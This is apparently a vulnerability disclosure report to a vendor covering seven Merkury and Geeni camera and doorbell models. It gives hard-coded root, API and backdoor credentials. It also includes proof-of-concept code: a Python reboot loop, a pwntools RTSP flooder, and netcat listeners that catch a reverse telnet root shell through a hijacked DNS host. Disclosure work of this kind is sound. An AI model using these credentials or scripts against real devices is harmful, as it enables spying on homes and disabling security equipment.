# Merkury Innovations / Geeni Multiple Disclosures

## Vulnerabilities

We uncovered multiple vulnerabilities in your Merkury Innovations and Geeni Security Camera and Doorbell product lines. 

## Affected Devices and Services

We uncovered vulnerabilities in seven Merkury and Geeni products that represent six di↵erent firmware versions.

The following section describes the following vulnerabilities in detail.

| Device | Type | FW Version | Telnet Service | RESTful API | Web Interface | RTSP Server |
|-------|------|------------|----------------|-------------|---------------|-------------|
| GNC-CW013 | Doorbell | 1.8.1 |  x   |    |  x |  x  |
| GNC-CW003 | Camera | 1.10.16 |     |  x  |   |    |
| GNC-CW010 | Camera | 1.3.5   |  x   |    |   |    |
| GNC-CW028 | Camera | 2.7.2   |  x   |  x  |   |    |
| GNC-CW025 | Doorbell | 2.9.5 |     |  x  |   |    |
| MI-CW024  | Doorbell | 2.9.6 |     |  x  |   |    |
| MI-CW017  | Camera | 2.9.6   |     |  x  |   |    |

- Telnet enabled with hard-coded credentials
- RESTful command server with hard-coded credentials.
- Streaming video application with hard-coded credentials.
- RSTP Daemon denial of service.
- RTSP Daemon remote code execution. 

###  Hard-coded credentials with Telnet service enabled

A vulnerability exists in the Telnet service of Firmware Version 1.3.5 that allows a remote attacker to take full control of the device with a high-privileged account. The vulnerability exists because a system account has a default and static password. An attacker could exploit this vulnerability by using this default account to connect to the a↵ected system. A successful exploit could allow the attacker to gain full control of an a↵ected device. This exists because the following administrator password hashes are statically built into the firmware. These hashes exist on the SPI flash of the device or can be retrieved through the RESTful interface as described in the following section.

    - Firmware 1.8.1   root:$1$zZjlr1sx$KnnqY6wT2GshVK5dRIlx4 (apix)
    - Firmware 2.7.2   root:$1$12345678$CTq8UQyYrE.vbbG7E8Mtj1 (unknown)

In the following versions of firmware, telnetd is either enabled or can be enabled through the RESTful command interface by calling /sys/telnetd/switch as described in the following section.

    - Firmware 1.8.1   Telnet is enabled by default
    - Firmware 2.7.2   Telnet can be enabled through the restful interface

### RESTful API with Hard-coded Credentials

A vulnerability exists in the RESTful Services API running on various Geenie and Merkury product lines that allows a remote attacker to take full control of the camera with a high-privileged account. The vulnerability exists because a static username and password are compiled into the ppsapp RESTful application. An attacker could exploit this vulnerability by using this default account to connect to the a↵ected system. The default username admin and password of 056565099. On Firmware version 1.35, this di↵ers with the username admin and default password admin.

A successful exploit could allow the attacker to gain full control of an a↵ected device. The following supported RESTful commands could lead to a disclosure of sensitive information, denial of service, or unauthenticated access.

- /proc/self/root/etc/passwd (Only > 2.00)
- /sys/info
- /sys/reboot
- /sys/factory_reset
- /sys/telnetd/switch (Only == 2.7.2)
- Sensitive information disclosure
- Sensitive information disclosure
- Denial of service
- Denial of service
- Allows unauthenticated access

```python
import requests
   from requests.auth import HTTPBasicAuth
   host = ’192.168.1.2’
   user=’admin’
   pswd=’056565099’
   while True:
      auth=auth=HTTPBasicAuth(user,pswd)
      url = ’http://’+host+’/devices/reboot’
      res=requests.post(url,auth=auth)
```

### Streaming Video Application with Hard-coded Credentials

A vulnerability in the Geeni DoorScreen Doorbell running Firmware 1.8.1 that allows a remote attacker to take full control of the camera with a high-privileged account. The vulnerability ex- ists because a static username and password are compiled into a shared library used to provide the streaming camera service. An attacker could exploit this vulnerability by using this default account to connect to the a↵ected system.

The Geenie DoorScreen Doorbell running Firmware Version 1.8.1 uses the libhipcam.so library to authenticate users to the camera system. It contains a backdoor account that is not logged and statically compiled into the library as depicted in the following figure. Thus, an unauthenticated user can log into the system using the username ”apexis” and password ”008”.

An unauthenticated user can login to a device using these hard-coded credentials and remotely view the doorbell camera.

### RSTP Daemon Denial of Service


A denial of service issue issue exists with the RSTPd server running on various Geenie Doorbell and Security Cameras. A remote attacker may cause an unexpected application termination, which triggers a device reboot and can lead to a permanent denial of service.

The vulnerability exists in the receive bu↵er handling on TCP port 38401 of the RTSPd daemon. Sending periodic and large messages to TCP/38401 will cause a denial of service attack in which the RSTP daemon shuts down, reboots the device, and/or hangs indefinitely. Although we have yet to prove it, it may be feasible that this vulnerability could lead to remote code execution conditions. Proof of concept code is depicted below.

```python

from pwn import *
   target = ’192.168.1.2’
   port = 38401
   io = remote(target,port)
   for i in range(1,100):
     sleep(0.5)
     io.send(cyclic(i*128*10))
     io.sendline()
 
 ```

 ### RTSP Daemon remote code execution

A vulnerability exists in the RTSP service that allows a remote attacker to take full control of the device with a high-privileged account. By sending a specially crafted message, an attacker is able to remotely deliver a telnet session. Its important to note that any attacker upstream from the victim can initiate this attack, including an ISP or network-admin.

A proof of concept attack flow follows. We assume an attacker has the ability to control DNS and can redirect apexisalarm.com to a host under their control. Then an attacker can open netcat on UDP port 8089 and wait for the RTSP daemon to connect. Upon connecting, an attacker can send cmd:start apx console, which will send a telnet session to the attacker’s IP on TCP port 9089.

```
$ nc -4 -l -v -p 8089 -u -v
   cmd:start apx console
```

Upon receiving the telnet session, the attacker may login with the username/passwords discovered previously in this report.

```
 $ nc -4 -l -v -p 9089 -v -k
   (none) login: root
   root
   Password: apix
   apix
   Welcome to HiLinux
   ~#
```


